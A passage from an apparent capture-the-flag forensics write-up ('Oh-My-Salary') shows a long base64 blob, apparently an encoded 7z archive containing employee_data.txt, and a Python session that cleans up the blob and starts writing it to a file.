LDqYU+u1MkYzUFv5G7cxrhSnE925Qt49t\nvVYboHky0jbgilGqU3j4tRQS2nSf3AskOrW4Fef2VyZVSJ1QKECoJg6cn7sXgG&#x2F;5eZvczXAAzsIk\nyf&#x2F;Beb4&#x2F;IFc3EIn0L8inS2Ds5rXUq0EyHaqyXwmR2gi1H8T4i9AHsB4HKFD91ThW&#x2F;agKel8K2BvW\n0Oawglav&#x2F;RZx4VtOIAkz&#x2F;j8wvnE6AvA87mbC+bWSUmpE&#x2F;3m9FuzG6aeMFrPvFJef6C8tLR5VhXWA\nh7zh52kaDTGlFDLnHmUUl99NmKhMqD6rinO6lMVUN1XnqEnftcAtfMeTGtte3iB5&#x2F;hwziuiGcekZ\nFKxMLhAM1w5OI0XwbMBvMcgDRMcGS7mLLeVqUrrJpv0&#x2F;AZ50ilbsop5vamOxFslt70rsJrQI4K7r\norGwlzC8oLqKxlfToV69j2bgSutxjZeJ6eIYhWkoWRWZ0qaaRdM1gDOvr6Swuq2Bz3e+UB7QAfc&#x2F;\n7S8HL8X6SFa14WkQlXbv63ACkhAbFmDL664u8MMS6yjukmmBwWILaSjn70HLTSbYYFJFDvsSX4C4\nKxPXprYvHpZYRN7QJ8Z6wh0+8WLGkexFgQ+5gp38ITKw2ZbEpUhyZ7g56pzXzcZ4Ao26imPCPPCM\nkxEjQNb25GazGW1ZeFRBuChEDRGhyHpVBrjHAVEOGHslXDlfiYCBxx4zHAbzl1bY2+JcYPSQysbP\n9Azm8dyjhwFxLTLi2oijgKt6ebc6yqGkCXYw7Lz35Sv9RlvjxhUDuomszKEx4igGFrfATGZflZWe\neSs&#x2F;oNSX2hIB3Z+Q&#x2F;CmF7&#x2F;iTtL+1&#x2F;3ppRNfclN6cf6xwkKQDay9+8LW87vHYDdUkyDGebhJVgUEU\nhkVqh84+ybzY8kDeJkYuaNasEHX5QtsEX64RERw38b4dFGxayy2121cHBIvgSy7F+p8tGr&#x2F;TAMvk\nS95mq2hCNH+eWAaYbN5KZXCESEMGcRqINziqAwPvtvyltGoshg3ltuZlHLxOZzR8ZkowZSoV5fgo\ng9pSEUGBtBMq2qtDBLlymITFTp3MCFeOb+N+eDgfeFci8hEwnWUjDVoYCgobi48TOb7ABFMXtyiq\nwswb6ISphq0MJTsAq4s2xN7jOC&#x2F;2axOqojgr7S3hmLjp4wUxKMdnofRW2jTxnsNnRadGguu&#x2F;EBYf\nWSHHKKzsdwgJXm+Y0KevgXMn&#x2F;Pc4qudjB&#x2F;KHlrVDifWCC&#x2F;JFMilPhkp4b1AYhryG2qSQTFH0M2l5\nUUYgXSsr1L9Qu512OqpDx4&#x2F;RRXM8IYilCfwAFz9Ahd7bz4HrJ60WmxJcpkzght6AfPAyg0iI334j\nnmsF9EZWuULIrg9V3kDaicX2IJqtQmn0jffRWmE3N8PqzO6NlMIMLWfP3C0HImct5iHAoWvkHpIZ\nC9dfbTfUY9SgSfF8kqWyF61NN0m&#x2F;tuhjc2SDUvHozoOuJrI1ym4zbt&#x2F;O2keRRBfgeBvo4idO85wP\nXSZnHukci9YTr6Yuegif9ZmU5iPyevxieCGVx8+1LTHHXRdLoTVAKd4pLD0&#x2F;v&#x2F;HziHLz6TL2o3Z9\na3HzhW3On3NM61mDqktNIqlZcEQTjZsw4KcP+EqSETHdb104M1PRxwPnS48DSnsEEOKEJuCULSjm\nA9pwgloS&#x2F;lQ&#x2F;OoS9r8jgwNQh3rXwuMeZCCrLSgiTVvVMP8UPH24QMQz3SjVn&#x2F;K&#x2F;MkhVQZLh3P8wE\nUzQd&#x2F;891HbbBwGpuPcnxMXFyJt055EpBNz65f&#x2F;&#x2F;kV0RHvtqXgLKuKWLduEv&#x2F;ZLxMWclnIDWOdZzQ\nuriMG0zHRZeLWNDlUmKf3nzFYQEX&#x2F;27RW5Iwy&#x2F;Op&#x2F;qsAb86&#x2F;+erv5AA616Wf2EyL2Kl6GaBW0EVK\n8LAr1fdxzV&#x2F;+D&#x2F;GaX4xeCbrdv&#x2F;i49TEelUQ2Ut7hNlmqWo09r+1zZZsHo9jsrfUUQfmvoKZhvFuR\nefISfOWWyCoCmxHkyuP5IrW39G78xGMD6pE+2DqExH1Et8VWCBGXYnz&#x2F;6BEHM54xYIzN8QbeSwqx\ndKeB4y3jo7NvSfes5T6&#x2F;Z+WRn3CJ&#x2F;N4WDYfugACnSlk6BAx83OC+yV41PcjsLHS6x3o1HsOmXwBj\nz&#x2F;fDuXnAxXvO6bhkVWB&#x2F;Byvp9blK2Y7995M2Gx9U826Cj&#x2F;vY+OWbFi8ifLEvulVBMyRpONsJ5CuI\nZZ2nw6QeVYk2OA8H8+68DcIrArhaH4qaaOLPIny+VRCZ21MF0GzjDZkHJC+k0fH8cdI7aTuXVw0O\nnr8zGZ7rUNgyn7f14thYnqg9C1E+uPgqTp9bPhDuDHG0PApvj4fnORvGzZCU8YfZE22MGhGihTgA\ngmGHshEDvlP&#x2F;LICC5RPTCR7LwOtmPZeRlbA9C8bl&#x2F;UwM4h7Az8a1089Uj8PuRvNOz8Mp3t717KHJ\nOtl0iy++jHj0qfpXkNn3BqmM7FsaP8Opn4efg6UI0nVg8kQqcD5KjWNVyd&#x2F;&#x2F;Wbnxoo4stjr4DOy7\nLI9Y9kO56NYZ9R54EiXw9UsyXnN4lvy62Al2rjRcpcA2yrK&#x2F;d52aDjP91AY0Q7PEHG3t++MG0jKl\nVEUPElOjyIQLbFcAAgv0omnHIfG3WrybE1AxVvAq25mxsS7NuyAQTs1+VOIbN+ZICRL9R6q9BXH+\nJ1yYwjPysIlEyUEfWsGFynPtAGdjtXA8hsDcWZU&#x2F;k1RFDlYu2w0jAQQGAAEJivAABwsBAAIkBvEH\nAQpTBwRUId45GliZISEBBQEADIrlwMxEAAgKAY5g2lMAAAUBGQUAAAAAABElAGUAbQBwAGwAbwB5\nAGUAZQBfAGQAYQB0AGEALgB0AHgAdAAAABQKAQDQbKHeApTVARUGAQAgAAAAAAA&#x3D;\n</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure>
<p>If you look carefully you’ll notice that it has a lot of new line escapes, so I used <code>python</code> to print the final base-64 data and save them into a file:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# python</span><br><span class="line">Python 2.7.16 (default, Apr  6 2019, 01:42:57)   </span><br><span class="line">[GCC 8.3.0] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.          </span><br><span class="line">&gt;&gt;&gt; print(&quot;N3q8ryccAATIxWF+8AoAAAAAAAB6AAAAAAAAANY3kCg6AWnJIc9uESaH5GfcRZ9lKuuWZ&#x2F;LK8Hnb\nmS+E+XYT7fZ3Nfq4zT1z+BAI9wL3lV5Jsiv&#x2F;n2EvBE4vc1+PHg&#x2F;L6QN9AfNG4KihNI8kLHOy02Cz\nJQzLFdT0Zei85AS3CZGZeRQBS+v&#x2F;U5HYv7AU6K67BU5v</span><br><span class="line">I+WQn3cVlc8WqbXm9bpqkwnvncy&#x2F;xsTG\nzoMY03OBXLJUU&#x2F;2jFsF2DOPI+uP6a3t8k5n2NaJGiRF0PsRXk2blrpTc1IFaIYI3ArmjWTuLVxYD\nohLpRppUt4+S4iOMX4AYXrzPNUL4zwEisXj8zAh4RB+E+y&#x2F;8nmXXzh0Pvn4aQAfw3ZsM4TWyQLVa\nUosmZu9rUICrUlRcskmZD</span><br><span class="line">D25WukXczXGe6lPwzDozKXmfgErTIPv7vJr57nDJffROYagZoAuW2eb\n3OVaeEfPnESeJHKULhXhfFtbqfVUOeU8TUVcym+47hEg8pTasXdPwbsRfjS+HpAJSAZ2pMtVPhXL\nO2AKQBpw70DoQpgHtk84S+hkbE4RALliYcoEPpQSP9GSSFlOV5wQiD9Xv&#x2F;GTdQ+Cvx+PUYYfTAlI</span><br><span class="line">\nfyNvE4KgrnV03LqhFN7jKJSPImvz6BlPp&#x2F;wyu2ar+3qjxFfnivSz8Vzmp+fA69gO6xI1WyMT7SfL\nF0PmjtVSR052JmKwvbrfTrFqaef4PfW5fOedyz4&#x2F;trqE7+xBHqwKqQf8dFUra87uec&#x2F;VruMJKbuO\nH0sJSCaURkVBFBre9grg0mlXKmxu88ovko5LOLq+S1A1e7DALF6zI</span><br><span class="line">9NzEIMp61r0ZISAC5RBir+3\nIk5xI0vJN+yEgFUzDCYkPJG7F8&#x2F;76K+m&#x2F;vgas20WxZTAj+6fpZRVQazxvq+f+ZvrXoPnF5eFKvqF\nqlPHOFn1L1urXts61aFTg+4epVK9JxfPx&#x2F;6q2iA6Gnw2LHGG4ZkviC7FiOd+GF3ysRd25SOuXUit\njkjUmRQoatL1RVQMbyp9KBkyRnjFUs</span><br><span class="line">9OWwHOkbYgl4REJ&#x2F;qGd7HMW4h8FeklkQ5Mjv1Sb&#x2F;fje9RA\n&#x2F;KxC+KzXoRqexkSBSoxc48zOTbhuAxyDMG5tw1i5SNoLDqYU+u1MkYzUFv5G7cxrhSnE925Qt49t\nvVYboHky0jbgilGqU3j4tRQS2nSf3AskOrW4Fef2VyZVSJ1QKECoJg6cn7sXgG&#x2F;5eZvczXAAzsIk\nyf&#x2F;Beb4</span><br><span class="line">&#x2F;IFc3EIn0L8inS2Ds5rXUq0EyHaqyXwmR2gi1H8T4i9AHsB4HKFD91ThW&#x2F;agKel8K2BvW\n0Oawglav&#x2F;RZx4VtOIAkz&#x2F;j8wvnE6AvA87mbC+bWSUmpE&#x2F;3m9FuzG6aeMFrPvFJef6C8tLR5VhXWA\nh7zh52kaDTGlFDLnHmUUl99NmKhMqD6rinO6lMVUN1XnqEnftcAtfMeTGtte3i</span><br><span class="line">B5&#x2F;hwziuiGcekZ\nFKxMLhAM1w5OI0XwbMBvMcgDRMcGS7mLLeVqUrrJpv0&#x2F;AZ50ilbsop5vamOxFslt70rsJrQI4K7r\norGwlzC8oLqKxlfToV69j2bgSutxjZeJ6eIYhWkoWRWZ0qaaRdM1gDOvr6Swuq2Bz3e+UB7QAfc&#x2F;\n7S8HL8X6SFa14WkQlXbv63ACkhAbFmDL664u8MM</span><br><span class="line">S6yjukmmBwWILaSjn70HLTSbYYFJFDvsSX4C4\nKxPXprYvHpZYRN7QJ8Z6wh0+8WLGkexFgQ+5gp38ITKw2ZbEpUhyZ7g56pzXzcZ4Ao26imPCPPCM\nkxEjQNb25GazGW1ZeFRBuChEDRGhyHpVBrjHAVEOGHslXDlfiYCBxx4zHAbzl1bY2+JcYPSQysbP\n9Azm8dyjhwFxLTLi</span><br><span class="line">2oijgKt6ebc6yqGkCXYw7Lz35Sv9RlvjxhUDuomszKEx4igGFrfATGZflZWe\neSs&#x2F;oNSX2hIB3Z+Q&#x2F;CmF7&#x2F;iTtL+1&#x2F;3ppRNfclN6cf6xwkKQDay9+8LW87vHYDdUkyDGebhJVgUEU\nhkVqh84+ybzY8kDeJkYuaNasEHX5QtsEX64RERw38b4dFGxayy2121cHBIvgSy7F+p8tGr&#x2F;</span><br><span class="line">TAMvk\nS95mq2hCNH+eWAaYbN5KZXCESEMGcRqINziqAwPvtvyltGoshg3ltuZlHLxOZzR8ZkowZSoV5fgo\ng9pSEUGBtBMq2qtDBLlymITFTp3MCFeOb+N+eDgfeFci8hEwnWUjDVoYCgobi48TOb7ABFMXtyiq\nwswb6ISphq0MJTsAq4s2xN7jOC&#x2F;2axOqojgr7S3hmLjp4wUx</span><br><span class="line">KMdnofRW2jTxnsNnRadGguu&#x2F;EBYf\nWSHHKKzsdwgJXm+Y0KevgXMn&#x2F;Pc4qudjB&#x2F;KHlrVDifWCC&#x2F;JFMilPhkp4b1AYhryG2qSQTFH0M2l5\nUUYgXSsr1L9Qu512OqpDx4&#x2F;RRXM8IYilCfwAFz9Ahd7bz4HrJ60WmxJcpkzght6AfPAyg0iI334j\nnmsF9EZWuULIrg9V3kDaicX2I</span><br><span class="line">JqtQmn0jffRWmE3N8PqzO6NlMIMLWfP3C0HImct5iHAoWvkHpIZ\nC9dfbTfUY9SgSfF8kqWyF61NN0m&#x2F;tuhjc2SDUvHozoOuJrI1ym4zbt&#x2F;O2keRRBfgeBvo4idO85wP\nXSZnHukci9YTr6Yuegif9ZmU5iPyevxieCGVx8+1LTHHXRdLoTVAKd4pLD0&#x2F;v&#x2F;HziHLz6TL2o3Z9\na3</span><br><span class="line">HzhW3On3NM61mDqktNIqlZcEQTjZsw4KcP+EqSETHdb104M1PRxwPnS48DSnsEEOKEJuCULSjm\nA9pwgloS&#x2F;lQ&#x2F;OoS9r8jgwNQh3rXwuMeZCCrLSgiTVvVMP8UPH24QMQz3SjVn&#x2F;K&#x2F;MkhVQZLh3P8wE\nUzQd&#x2F;891HbbBwGpuPcnxMXFyJt055EpBNz65f&#x2F;&#x2F;kV0RHvtqXgLKuKWLdu</span><br><span class="line">Ev&#x2F;ZLxMWclnIDWOdZzQ\nuriMG0zHRZeLWNDlUmKf3nzFYQEX&#x2F;27RW5Iwy&#x2F;Op&#x2F;qsAb86&#x2F;+erv5AA616Wf2EyL2Kl6GaBW0EVK\n8LAr1fdxzV&#x2F;+D&#x2F;GaX4xeCbrdv&#x2F;i49TEelUQ2Ut7hNlmqWo09r+1zZZsHo9jsrfUUQfmvoKZhvFuR\nefISfOWWyCoCmxHkyuP5IrW39G78xGMD6p</span><br><span class="line">E+2DqExH1Et8VWCBGXYnz&#x2F;6BEHM54xYIzN8QbeSwqx\ndKeB4y3jo7NvSfes5T6&#x2F;Z+WRn3CJ&#x2F;N4WDYfugACnSlk6BAx83OC+yV41PcjsLHS6x3o1HsOmXwBj\nz&#x2F;fDuXnAxXvO6bhkVWB&#x2F;Byvp9blK2Y7995M2Gx9U826Cj&#x2F;vY+OWbFi8ifLEvulVBMyRpONsJ5CuI\nZZ2nw6QeVYk</span><br><span class="line">2OA8H8+68DcIrArhaH4qaaOLPIny+VRCZ21MF0GzjDZkHJC+k0fH8cdI7aTuXVw0O\nnr8zGZ7rUNgyn7f14thYnqg9C1E+uPgqTp9bPhDuDHG0PApvj4fnORvGzZCU8YfZE22MGhGihTgA\ngmGHshEDvlP&#x2F;LICC5RPTCR7LwOtmPZeRlbA9C8bl&#x2F;UwM4h7Az8a1089Uj8PuRvNOz8</span><br><span class="line">Mp3t717KHJ\nOtl0iy++jHj0qfpXkNn3BqmM7FsaP8Opn4efg6UI0nVg8kQqcD5KjWNVyd&#x2F;&#x2F;Wbnxoo4stjr4DOy7\nLI9Y9kO56NYZ9R54EiXw9UsyXnN4lvy62Al2rjRcpcA2yrK&#x2F;d52aDjP91AY0Q7PEHG3t++MG0jKl\nVEUPElOjyIQLbFcAAgv0omnHIfG3WrybE1AxVvAq25m</span><br><span class="line">xsS7NuyAQTs1+VOIbN+ZICRL9R6q9BXH+\nJ1yYwjPysIlEyUEfWsGFynPtAGdjtXA8hsDcWZU&#x2F;k1RFDlYu2w0jAQQGAAEJivAABwsBAAIkBvEH\nAQpTBwRUId45GliZISEBBQEADIrlwMxEAAgKAY5g2lMAAAUBGQUAAAAAABElAGUAbQBwAGwAbwB5\nAGUAZQBfAGQAYQB0AGEA</span><br><span class="line">LgB0AHgAdAAAABQKAQDQbKHeApTVARUGAQAgAAAAAAA&#x3D;\n&quot;)</span><br><span class="line">N3q8ryccAATIxWF+8AoAAAAAAAB6AAAAAAAAANY3kCg6AWnJIc9uESaH5GfcRZ9lKuuWZ&#x2F;LK8Hnb</span><br><span class="line">mS+E+XYT7fZ3Nfq4zT1z+BAI9wL3lV5Jsiv&#x2F;n2EvBE4vc1+PHg&#x2F;L6QN9AfNG4KihNI8kLHOy02Cz</span><br><span class="line">JQzLFdT0Zei85AS3CZGZeRQBS+v&#x2F;U5HYv7AU6K67BU5vI+WQn3cVlc8WqbXm9bpqkwnvncy&#x2F;xsTG   </span><br><span class="line">zoMY03OBXLJUU&#x2F;2jFsF2DOPI+uP6a3t8k5n2NaJGiRF0PsRXk2blrpTc1IFaIYI3ArmjWTuLVxYD</span><br><span class="line">ohLpRppUt4+S4iOMX4AYXrzPNUL4zwEisXj8zAh4RB+E+y&#x2F;8nmXXzh0Pvn4aQAfw3ZsM4TWyQLVa</span><br><span class="line">UosmZu9rUICrUlRcskmZDD25WukXczXGe6lPwzDozKXmfgErTIPv7vJr57nDJffROYagZoAuW2eb</span><br><span class="line">3OVaeEfPnESeJHKULhXhfFtbqfVUOeU8TUVcym+47hEg8pTasXdPwbsRfjS+HpAJSAZ2pMtVPhXL</span><br><span class="line">O2AKQBpw70DoQpgHtk84S+hkbE4RALliYcoEPpQSP9GSSFlOV5wQiD9Xv&#x2F;GTdQ+Cvx+PUYYfTAlI</span><br><span class="line">fyNvE4KgrnV03LqhFN7jKJSPImvz6BlPp&#x2F;wyu2ar+3qjxFfnivSz8Vzmp+fA69gO6xI1WyMT7SfL</span><br><span class="line">F0PmjtVSR052JmKwvbrfTrFqaef4PfW5fOedyz4&#x2F;trqE7+xBHqwKqQf8dFUra87uec&#x2F;VruMJKbuO</span><br><span class="line">H0sJSCaURkVBFBre9grg0mlXKmxu88ovko5LOLq+S1A1e7DALF6zI9NzEIMp61r0ZISAC5RBir+3</span><br><span class="line">Ik5xI0vJN+yEgFUzDCYkPJG7F8&#x2F;76K+m&#x2F;vgas20WxZTAj+6fpZRVQazxvq+f+ZvrXoPnF5eFKvqF</span><br><span class="line">qlPHOFn1L1urXts61aFTg+4epVK9JxfPx&#x2F;6q2iA6Gnw2LHGG4ZkviC7FiOd+GF3ysRd25SOuXUit</span><br><span class="line">jkjUmRQoatL1RVQMbyp9KBkyRnjFUs9OWwHOkbYgl4REJ&#x2F;qGd7HMW4h8FeklkQ5Mjv1Sb&#x2F;fje9RA</span><br><span class="line">&#x2F;KxC+KzXoRqexkSBSoxc48zOTbhuAxyDMG5tw1i5SNoLDqYU+u1MkYzUFv5G7cxrhSnE925Qt49t</span><br><span class="line">vVYboHky0jbgilGqU3j4tRQS2nSf3AskOrW4Fef2VyZVSJ1QKECoJg6cn7sXgG&#x2F;5eZvczXAAzsIk</span><br><span class="line">yf&#x2F;Beb4&#x2F;IFc3EIn0L8inS2Ds5rXUq0EyHaqyXwmR2gi1H8T4i9AHsB4HKFD91ThW&#x2F;agKel8K2BvW</span><br><span class="line">0Oawglav&#x2F;RZx4VtOIAkz&#x2F;j8wvnE6AvA87mbC+bWSUmpE&#x2F;3m9FuzG6aeMFrPvFJef6C8tLR5VhXWA</span><br><span class="line">h7zh52kaDTGlFDLnHmUUl99NmKhMqD6rinO6lMVUN1XnqEnftcAtfMeTGtte3iB5&#x2F;hwziuiGcekZ</span><br><span class="line">FKxMLhAM1w5OI0XwbMBvMcgDRMcGS7mLLeVqUrrJpv0&#x2F;AZ50ilbsop5vamOxFslt70rsJrQI4K7r</span><br><span class="line">orGwlzC8oLqKxlfToV69j2bgSutxjZeJ6eIYhWkoWRWZ0qaaRdM1gDOvr6Swuq2Bz3e+UB7QAfc&#x2F;</span><br><span class="line">7S8HL8X6SFa14WkQlXbv63ACkhAbFmDL664u8MMS6yjukmmBwWILaSjn70HLTSbYYFJFDvsSX4C4</span><br><span class="line">KxPXprYvHpZYRN7QJ8Z6wh0+8WLGkexFgQ+5gp38ITKw2ZbEpUhyZ7g56pzXzcZ4Ao26imPCPPCM</span><br><span class="line">kxEjQNb25GazGW1ZeFRBuChEDRGhyHpVBrjHAVEOGHslXDlfiYCBxx4zHAbzl1bY2+JcYPSQysbP</span><br><span class="line">9Azm8dyjhwFxLTLi2oijgKt6ebc6yqGkCXYw7Lz35Sv9RlvjxhUDuomszKEx4igGFrfATGZflZWe</span><br><span class="line">eSs&#x2F;oNSX2hIB3Z+Q&#x2F;CmF7&#x2F;iTtL+1&#x2F;3ppRNfclN6cf6xwkKQDay9+8LW87vHYDdUkyDGebhJVgUEU</span><br><span class="line">hkVqh84+ybzY8kDeJkYuaNasEHX5QtsEX64RERw38b4dFGxayy2121cHBIvgSy7F+p8tGr&#x2F;TAMvk</span><br><span class="line">S95mq2hCNH+eWAaYbN5KZXCESEMGcRqINziqAwPvtvyltGoshg3ltuZlHLxOZzR8ZkowZSoV5fgo</span><br><span class="line">g9pSEUGBtBMq2qtDBLlymITFTp3MCFeOb+N+eDgfeFci8hEwnWUjDVoYCgobi48TOb7ABFMXtyiq</span><br><span class="line">wswb6ISphq0MJTsAq4s2xN7jOC&#x2F;2axOqojgr7S3hmLjp4wUxKMdnofRW2jTxnsNnRadGguu&#x2F;EBYf</span><br><span class="line">WSHHKKzsdwgJXm+Y0KevgXMn&#x2F;Pc4qudjB&#x2F;KHlrVDifWCC&#x2F;JFMilPhkp4b1AYhryG2qSQTFH0M2l5</span><br><span class="line">UUYgXSsr1L9Qu512OqpDx4&#x2F;RRXM8IYilCfwAFz9Ahd7bz4HrJ60WmxJcpkzght6AfPAyg0iI334j</span><br><span class="line">nmsF9EZWuULIrg9V3kDaicX2IJqtQmn0jffRWmE3N8PqzO6NlMIMLWfP3C0HImct5iHAoWvkHpIZ</span><br><span class="line">C9dfbTfUY9SgSfF8kqWyF61NN0m&#x2F;tuhjc2SDUvHozoOuJrI1ym4zbt&#x2F;O2keRRBfgeBvo4idO85wP</span><br><span class="line">XSZnHukci9YTr6Yuegif9ZmU5iPyevxieCGVx8+1LTHHXRdLoTVAKd4pLD0&#x2F;v&#x2F;HziHLz6TL2o3Z9</span><br><span class="line">a3HzhW3On3NM61mDqktNIqlZcEQTjZsw4KcP+EqSETHdb104M1PRxwPnS48DSnsEEOKEJuCULSjm</span><br><span class="line">A9pwgloS&#x2F;lQ&#x2F;OoS9r8jgwNQh3rXwuMeZCCrLSgiTVvVMP8UPH24QMQz3SjVn&#x2F;K&#x2F;MkhVQZLh3P8wE</span><br><span class="line">UzQd&#x2F;891HbbBwGpuPcnxMXFyJt055EpBNz65f&#x2F;&#x2F;kV0RHvtqXgLKuKWLduEv&#x2F;ZLxMWclnIDWOdZzQ</span><br><span class="line">uriMG0zHRZeLWNDlUmKf3nzFYQEX&#x2F;27RW5Iwy&#x2F;Op&#x2F;qsAb86&#x2F;+erv5AA616Wf2EyL2Kl6GaBW0EVK</span><br><span class="line">8LAr1fdxzV&#x2F;+D&#x2F;GaX4xeCbrdv&#x2F;i49TEelUQ2Ut7hNlmqWo09r+1zZZsHo9jsrfUUQfmvoKZhvFuR</span><br><span class="line">efISfOWWyCoCmxHkyuP5IrW39G78xGMD6pE+2DqExH1Et8VWCBGXYnz&#x2F;6BEHM54xYIzN8QbeSwqx</span><br><span class="line">dKeB4y3jo7NvSfes5T6&#x2F;Z+WRn3CJ&#x2F;N4WDYfugACnSlk6BAx83OC+yV41PcjsLHS6x3o1HsOmXwBj</span><br><span class="line">z&#x2F;fDuXnAxXvO6bhkVWB&#x2F;Byvp9blK2Y7995M2Gx9U826Cj&#x2F;vY+OWbFi8ifLEvulVBMyRpONsJ5CuI</span><br><span class="line">ZZ2nw6QeVYk2OA8H8+68DcIrArhaH4qaaOLPIny+VRCZ21MF0GzjDZkHJC+k0fH8cdI7aTuXVw0O</span><br><span class="line">nr8zGZ7rUNgyn7f14thYnqg9C1E+uPgqTp9bPhDuDHG0PApvj4fnORvGzZCU8YfZE22MGhGihTgA</span><br><span class="line">gmGHshEDvlP&#x2F;LICC5RPTCR7LwOtmPZeRlbA9C8bl&#x2F;UwM4h7Az8a1089Uj8PuRvNOz8Mp3t717KHJ</span><br><span class="line">Otl0iy++jHj0qfpXkNn3BqmM7FsaP8Opn4efg6UI0nVg8kQqcD5KjWNVyd&#x2F;&#x2F;Wbnxoo4stjr4DOy7</span><br><span class="line">LI9Y9kO56NYZ9R54EiXw9UsyXnN4lvy62Al2rjRcpcA2yrK&#x2F;d52aDjP91AY0Q7PEHG3t++MG0jKl</span><br><span class="line">VEUPElOjyIQLbFcAAgv0omnHIfG3WrybE1AxVvAq25mxsS7NuyAQTs1+VOIbN+ZICRL9R6q9BXH+</span><br><span class="line">J1yYwjPysIlEyUEfWsGFynPtAGdjtXA8hsDcWZU&#x2F;k1RFDlYu2w0jAQQGAAEJivAABwsBAAIkBvEH</span><br><span class="line">AQpTBwRUId45GliZISEBBQEADIrlwMxEAAgKAY5g2lMAAAUBGQUAAAAAABElAGUAbQBwAGwAbwB5</span><br><span class="line">AGUAZQBfAGQAYQB0AGEALgB0AHgAdAAAABQKAQDQbKHeApTVARUGAQAgAAAAAAA&#x3D;</span><br><span class="line">&gt;&gt;&gt; with open(&quot;final.b64&quot;,&quot;w&quot;) as f:</span><br><span class="line">...     f.write(&quot;N3q8ryccAATIxWF+8AoAAAAAAAB6AAAAAAAAANY3kCg6AWnJIc9uESaH5GfcRZ9lKuuWZ&#x2F;LK8Hnb\nmS+E+XYT7fZ3Nfq4zT1z+BAI9wL3lV5Jsiv&#x2F;n2EvBE4vc1+PHg&#x2F;L6QN9AfNG4KihNI8kLHOy02Cz\nJQzLFdT0Zei85AS3CZGZeRQBS+v&#x2F;U5HYv7AU6K</span><br><span class="line">67BU5vI+WQn3cVlc8WqbXm9bpqkwnvncy&#x2F;xsTG\nzoMY03OBXLJUU&#x2F;2jFsF2DOPI+uP6a3t8k5n2NaJGiRF0PsRXk2blrpTc1IFaIYI3ArmjWTuLVxYD\nohLpRppUt4+S4iOMX4AYXrzPNUL4zwEisXj8zAh4RB+E+y&#x2F;8nmXXzh0Pvn4aQAfw3ZsM4TWyQLVa\nUosmZu9rUICrUlR</span><br><span class="line">cskmZDD25WukXczXGe6lPwzDozKXmfgErTIPv7vJr57nDJffROYagZoAuW2eb\n3OVaeEfPnESeJHKULhXhfFtbqfVUOeU8TUVcym+47hEg8pTasXdPwbsRfjS+HpAJSAZ2pMtVPhXL\nO2AKQBpw70DoQpgHtk84S+hkbE4RALliYcoEPpQSP9GSSFlOV5wQiD9Xv&#x2F;GTdQ+Cvx+PUY</span><br><span class="line">YfTAlI\nfyNvE4KgrnV03LqhFN7jKJSPImvz6BlPp&#x2F;wyu2ar+3qjxFfnivSz8Vzmp+fA69gO6xI1WyMT7SfL\nF0PmjtVSR052JmKwvbrfTrFqaef4PfW5fOedyz4&#x2F;trqE7+xBHqwKqQf8dFUra87uec&#x2F;VruMJKbuO\nH0sJSCaURkVBFBre9grg0mlXKmxu88ovko5LOLq+S1A1e7D</span><br><span class="line">ALF6zI9NzEIMp61r0ZISAC5RBir+3\nIk5xI0vJN+yEgFUzDCYkPJG7F8&#x2F;76K+m&#x2F;vgas20WxZTAj+6fpZRVQazxvq+f+ZvrXoPnF5eFKvqF\nqlPHOFn1L1urXts61aFTg+4epVK9JxfPx&#x2F;6q2iA6Gnw2LHGG4ZkviC7FiOd+GF3ysRd25SOuXUit\njkjUmRQoatL1RVQMbyp9KBky</span><br><span class="line">RnjFUs9OWwHOkbYgl4REJ&#x2F;qGd7HMW4h8FeklkQ5Mjv1Sb&#x2F;fje9RA\n&#x2F;KxC+KzXoRqexkSBSoxc48zOTbhuAxyDMG5tw1i5SNoLDqYU+u1MkYzUFv5G7cxrhSnE925Qt49t\nvVYboHky0jbgilGqU3j4tRQS2nSf3AskOrW4Fef2VyZVSJ1QKECoJg6cn7sXgG&#x2F;5eZvczXAAzsIk\ny</span><br><span 